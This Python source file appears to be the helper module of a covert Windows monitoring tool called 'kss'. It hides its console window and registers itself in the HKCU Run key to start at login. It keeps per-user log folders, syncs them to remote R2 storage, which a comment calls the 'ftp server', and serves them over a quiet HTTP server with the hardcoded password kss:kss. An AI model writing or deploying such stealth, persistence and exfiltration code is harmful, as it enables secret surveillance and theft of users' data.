import socket
import os
import datetime
import winreg
import http.server
import base64
import socketserver
import netifaces
import platform
from sync_r2 import R2FolderSync


def user_name():
    try:
        return os.getlogin()
    except Exception:
        return "user"


def current_time():
    return datetime.datetime.now().strftime("%Y%m%d-%H%M%S")


def dir_path():
    try:
        home_path = os.path.expanduser("~")
        dir_name = "kss"
        app_root = os.path.join(home_path, dir_name)
        dir_path = os.path.join(app_root, user_name())
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)
        os.chdir(dir_path)
        return dir_path
    except Exception:
        return None


# #this hide function help to minimize the console
def hide_console():
    try:
        import win32console, win32gui

        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)
        return True
    except Exception:
        return False


def add_startup():
    try:
        pth = os.path.dirname(os.path.realpath(__file__))
        s_name = "kss.py"
        address = os.path.join(pth, s_name)
        key = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        open_key = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(open_key, "kss", 0, winreg.REG_SZ, address)
        winreg.CloseKey(open_key)
    except Exception:
        pass


# check if internet is connected or not
def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        return False


# Upload log directory to ftp server
def sync(sync_interval=30, continuous=False):
    try:
        home_path = os.path.expanduser("~")
        dir_list = os.listdir(home_path)
        if "kss" in dir_list:
            source_path = os.path.join(home_path, "kss")
            syncer = R2FolderSync(local_folder=source_path, sync_interval=sync_interval)
            if continuous:
                syncer.start_sync_loop()
            else:
                syncer.sync_once()
    except Exception:
        pass


class AuthHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppress all HTTP server logs
        pass

    def do_GET(self):
        auth_header = self.headers.get("Authorization")
        if not auth_header:
            self.send_response(401)
            self.send_header("WWW-Authenticate", 'Basic realm="Test"')
            self.end_headers()
            return
        auth_type, auth_string = auth_header.split()
        try:
            creds = base64.b64decode(auth_string).decode().split(":")
        except Exception:
            self.send_error(400, "Bad request")
            return
        if auth_type != "Basic" or creds != ["kss", "kss"]:
            self.send_error(401, "Unauthorized")
            return
        super().do_GET()


def server(port=8000):
    handler = AuthHandler
    with socketserver.TCPServer(("", port), handler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            httpd.server_close()
            # Exit silently on Ctrl+C
            pass


def get_interface_name_windows(guid):
    try:
        reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        key = winreg.OpenKey(
            reg,
            r"SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}",
        )
        subkey = winreg.OpenKey(key, guid + r"\Connection")
        name = winreg.QueryValueEx(subkey, "Name")[0]
        return name
    except Exception:
        return None


def active_interface():
    try:
        gateways = netifaces.gateways()
        default_gateway = gateways.get('default', {})
        iface = None
        if netifaces.AF_INET in default_gateway:
            iface = default_gateway[netifaces.AF_INET][1]
        if not iface:
            return None
        if platform.system() == "Windows":
            name = get_interface_name_windows(iface)
            return name if name else iface
        else:
            return iface
    except Exception:
        return None